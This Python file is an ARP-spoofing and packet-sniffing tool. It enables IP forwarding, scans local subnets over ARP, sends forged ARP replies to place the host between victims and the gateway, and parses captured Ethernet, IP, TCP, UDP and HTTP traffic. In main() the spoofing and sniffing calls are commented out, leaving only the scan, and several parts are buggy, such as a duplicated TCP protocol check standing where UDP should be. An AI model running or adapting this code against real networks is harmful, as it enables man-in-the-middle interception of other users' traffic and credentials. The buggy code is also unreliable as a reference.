import socket
import struct
import uuid
import codecs
import binascii
from tabnanny import verbose
import psutil
import time
import os
from scapy.all import *
import scapy.config
import scapy.layers.l2
import scapy.route
import sys

from scapy.layers.l2 import ARP, Ether

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            field = line.strip().split()
            if field[1] != '00000000' or not int(field[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return socket.inet_ntoa(struct.pack("<L", int(field[2], 16)))

#return poperly formated mac adress
def get_mac_adress(bytes_addres):
    bytes_string = map('{:02x}'.format, bytes_addres)
    mac_adress = ':'.join(bytes_string).upper()
    return mac_adress

host_ip = socket.gethostbyname(socket.gethostname())
host_mac = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big'))
gateway_ip = get_default_gateway_linux()
gateway_mac = ''


# Unpack ethernet frame (AA:BB:CC:DD:EE:FF)
def ethernet_frame(data):
    dest_mac, source_mac, proto = struct.unpack('! 6s 6s H', data[:14])
    return get_mac_adress(dest_mac), get_mac_adress(source_mac), socket.htons(proto), data[14:]

# Return proper IPv4 addres
def ipv4(addres):
    return '.'.join(map(str, addres))

# Unpack IPv4 packet
def ipv4_packet(data):
    version_header_length = data[0]
    version  = version_header_length >> 4
    header_length = (version_header_length & 15) * 4
    time_to_live, proto, src, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])
    return version, header_length, time_to_live, proto, ipv4(src), ipv4(target), data[header_length:]

# Unpack ICMP packet
def ismp_packet(data):
    icmp_type, code, checksumm = struct.unpack('! B B H', data[:4])
    return icmp_type, code, checksumm, data[4:]

# Unpack TCP segment
def tcp_segment(data):
    (src_port, dest_port, sequence, aknowledgment, offset_reseved_flags) = struct.unpack('! H H L L H', data[:14])
    offset = (offset_reseved_flags >> 12) * 4
    flag_urg = (offset_reseved_flags & 32) >> 5
    flag_ack = (offset_reseved_flags & 16) >> 4
    flag_psh = (offset_reseved_flags & 8) >> 3
    flag_rst = (offset_reseved_flags & 4) >> 2
    flag_syn = (offset_reseved_flags & 2) >> 1
    flag_fin = offset_reseved_flags & 1
    return src_port, dest_port, sequence, aknowledgment, offset_reseved_flags, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data[offset:]

# Unpack UDP segment
def udp_secment(data):
    src_port, dest_port, size = struct.unpack('! H H 2x H', data[:8])
    return src_port, dest_port, size, data[8:]

def parse_http(data):
    try:
        return data.decode('utf-8')
    except UnicodeDecodeError:
        return data.decode('latin1', errors='ignore')

class Ethernet_frame():
    def __init__(self, data):
        self.dest_mac, self.source_mac, self.eth_proto, self.data = ethernet_frame(data)
        self.type = 'Ethernet_frame'
    def print_values(self):
        print('Ethernet Frame')
        print('Destination: {}, Source: {}, Protocol: {}'.format(self.dest_mac, self.source_mac, self.eth_proto))

    # conversion to string instead of printing
    def toString(self):
        s = 'Ethernet Frame\n'
        s += 'Destination: {}, Source: {}, Protocol: {}\n'.format(self.dest_mac, self.source_mac, self.eth_proto)
        return s

class IPv4_packet(Ethernet_frame):
    def __init__(self, data):
        Ethernet_frame.__init__(self, data)
        self.version, self.header_length, self.time_to_live, self.proto, self.src, self.target, self.data = ipv4_packet(self.data)
        self.type = 'IPv4_packet'
    def print_values(self):
        Ethernet_frame.print_values(self)
        if (self.eth_proto == 8):
            print('IPv4 packet:')
            print('Version: {}, Header lenght: {}, time to live: {}'.format(self.version, self.header_length, self.time_to_live))
            print('Protocol: {}, Source: {}, Target: {}'.format(self.proto, self.src, self.target))

    def toString(self):
        s = Ethernet_frame.toString(self)
        s += 'IPv4 packet:\n'
        s += 'Version: {}, Header lenght: {}, time to live: {}\n'.format(self.version, self.header_length, self.time_to_live)
        s += 'Protocol: {}, Source: {}, Target: {}\n'.format(self.proto, self.src, self.target)
        return s

class ARP_packet(Ethernet_frame):
    def __init__(self, data):
        Ethernet_frame.__init__(self, data)
        self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation, self.b_SHA, self.b_SPA, self.b_THA, self.b_TPA = struct.unpack('! H H B B H s[6] s[4] s[6] s[4]', self.data)
        self.SHA, self.SPA, self.THA, self.TPA = get_mac_adress(self.b_SHA), ipv4(self.b_SPA), get_mac_adress(self.b_THA), ipv4(self.b_TPA)
        self.type = 'ARP_packet'
    def print_values(self):
        Ethernet_frame.print_values(self)
        print("ARP request:")
        print('HTYPE: {}, PTYPE: {}, HLEN: {}, PLEN: {}, operation: {}'.format(self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation))
        print('SHA: {}, SPA: {}, THA: {}, TPA: {}'.format(self.SHA, self.SPA, self.THA, self.TPA))

    def toString(self):
        Ethernet_frame.toString(self)
        s = 'ARP request:\n'
        s += 'HTYPE: {}, PTYPE: {}, HLEN: {}, PLEN: {}, operation: {}\n'.format(self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation)
        s += 'SHA: {}, SPA: {}, THA: {}, TPA: {}\n'.format(self.SHA, self.SPA, self.THA, self.TPA)
        return s

class ICMP(IPv4_packet):
    def __init__(self, data):
        IPv4_packet.__init__(self, data)
        self.icmp_type, self.code, self.checksumm, self.data = ismp_packet(self.data)
        self.type = 'ICMP'
    def print_values(self):
        IPv4_packet.print_values(self)
        print('ICMP packet:')
        print('ICMP type: {}, Code: {}, Checksumm: {}'.format(self.icmp_type, self.code, self.checksumm))

    def toString(self):
        s = IPv4_packet.toString(self)
        s += 'ICMP packet:\n'
        s += 'ICMP type: {}, Code: {}, Checksumm: {}\n'.format(self.icmp_type, self.code, self.checksumm)
        return s


class TCP(IPv4_packet):
    def __init__(self, data):
        IPv4_packet.__init__(self, data)
        self.src_port, self.dest_port, self.sequence, self.aknowledgment, self.offset_reseved_flags, self.flag_urg, self.flag_ack, self.flag_psh, self.flag_rst, self.flag_syn, self.flag_fin, self.data = tcp_segment(self.data)
        self.type = 'TCP'
    def print_values(self):
        IPv4_packet.print_values(self)
        print('TCP packet:')
        print('Source port: {}, Destination port: {}'.format(self.src_port, self.dest_port))
        print('Sequence: {}, aknowledgment: {}'.format(self.sequence, self.aknowledgment))
        print('Flags:')
        print('URG: {}, ACK: {}, PSH: {}, SYN: {}, FIN: {}'.format(self.flag_urg, self.flag_ack, self.flag_psh, self.flag_rst, self.flag_syn, self.flag_fin))
    def toString(self):
        s = IPv4_packet.toString(self)
        s += 'TCP packet:\n'
        s += 'Source port: {}, Destination port: {}\n'.format(self.src_port, self.dest_port)
        s += 'Sequence: {}, aknowledgment: {}\n'.format(self.sequence, self.aknowledgment)
        s += 'Flags:\n'
        s += 'URG: {}, ACK: {}, PSH: {}, SYN: {}, FIN: {}\n'.format(self.flag_urg, self.flag_ack, self.flag_psh, self.flag_rst, self.flag_syn, self.flag_fin)
        return s

class UDP(IPv4_packet):
    def __init__(self, data):
        IPv4_packet.__init__(self, data)
        self.src_port, self.dest_port, self.size, self.data = udp_secment(data)
        self.type = 'UDP'
    def print_values(self):
        IPv4_packet.print_values(self)
        print('UDP packet:')
        print('Source port: {}, Destination port: {}, Size: {}'.format(self.src_port, self.dest_port, self.size))
    def toString(self):
        s = IPv4_packet.toString(self)
        s += 'UDP packet:\n'
        s += 'Source port: {}, Destination port: {}, Size: {}\n'.format(self.src_port, self.dest_port, self.size)
        return s

class HTTP(TCP):
    def __init__(self, data):
        TCP.__init__(self, data)
        self.http_string = parse_http(self.data)
        self.type = 'HTTP'
    def print_values(self):
        TCP.print_values(self)
        print('HTTP request:')
        print('HTTP string: {}'.format(self.http_string))
    def toString(self):
        s = TCP.toString(self)
        s += 'HTTP request:\n'
        s += 'HTTP string: {}\n'.format(self.http_string)
        return s


def factory(data):
    obj = Ethernet_frame(data)
    if (obj.eth_proto == 8):
        obj = IPv4_packet(data)
        if (obj.proto == 1):
            obj = ICMP(data)
        elif (obj.proto == 6):
            obj = TCP(data)
            if (b'HTTP' in obj.data):
                obj = HTTP(data)
        elif (obj.proto == 6):
            obj = UDP(data)
    elif (obj.eth_proto == b'\x08\x06'):
        obj = ARP_packet(data)
    return obj

def spoof(victim_ip, victim_mac, gateway_ip, gateway_mac):
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac))
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac))

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7)
    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    ans_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    for i in ans_list:
        return i[1].hwsrc

def long2net(arg):
    if (arg <= 0 or arg >= 0xFFFFFFFF):
        raise ValueError("illegal netmask value", hex(arg))
    return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))


def to_CIDR_notation(bytes_network, bytes_netmask):
    network = scapy.utils.ltoa(bytes_network)
    netmask = long2net(bytes_netmask)
    net = "%s/%s" % (network, netmask)
    if netmask < 16:
        return None
    return net


def scan(net, interface, timeout=5):
    ret = []
    try:
        ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=True)
        for s, r in ans.res:
            line = [r.src, r.psrc]
            try:
                #hostname = socket.gethostbyaddr(r.psrc)
                #line += " " + hostname[0]
                ret.append(line)
            except socket.herror:
                # failed to resolve
                pass
    except socket.error as e:
        raise
    return ret

class Client():
    def __init__(self, ip, mac):
        self.ip = ip
        self.mac = mac
        self.type = (self.ip == host_ip or self.ip == gateway_ip)

class IPtable():
    def __init__(self, host_mac, host_ip, gateway_ip, gateway_mac):
        self.mac = host_mac
        self.ip = host_ip
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]

    def find(self, client):
        for i, c in enumerate(self.clients):
            if (c.ip == client.ip):
                return i
        return -1

    def emplase(self, client):
        if (self.find(client) == -1):
            self.clients.append(client)
            spoof(client.ip, client.mac, self.gateway_ip, self.gateway_mac)

    def drop(self, client):
        if (self.find(client) != -1):
            self.clients.append(client)
            restore(client.ip, client.mac, self.gateway_ip, self.mac)

    def scan(self):
        ips = []
        for network, netmask, _, interface, address, _ in scapy.config.conf.route.routes:
            # skip loopback network and default gw
            if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
                continue
            if netmask <= 0 or netmask == 0xFFFFFFFF:
                continue
            # skip docker interface
            if (interface.startswith('docker')
                    or interface.startswith('br-')
                    or interface.startswith('tun')):
                continue
            net = to_CIDR_notation(network, netmask)
            if net:
                i = scan(net, interface)
                for line in i:
                    ips.append(line)
        for i in ips:
            self.clients.append(Client(ips[1], ips[0]))

    def attack(self):
        for client in self.clients:
            if (client.type == False):
                spoof(client.ip, client.mac, self.gateway_ip, self.gateway_mac)


def main():
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    gateway_mac = get_mac(gateway_ip)
    Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
    Ips.scan()
    #Ips.attack()
    #while (True):
    #    raw_data, address = conn.recvfrom(65535)
    #    Seg = factory(raw_data)
    #    Seg.print_values()
    for client in Ips.clients:
        print(client.ip)



if __name__ == '__main__':
    main()
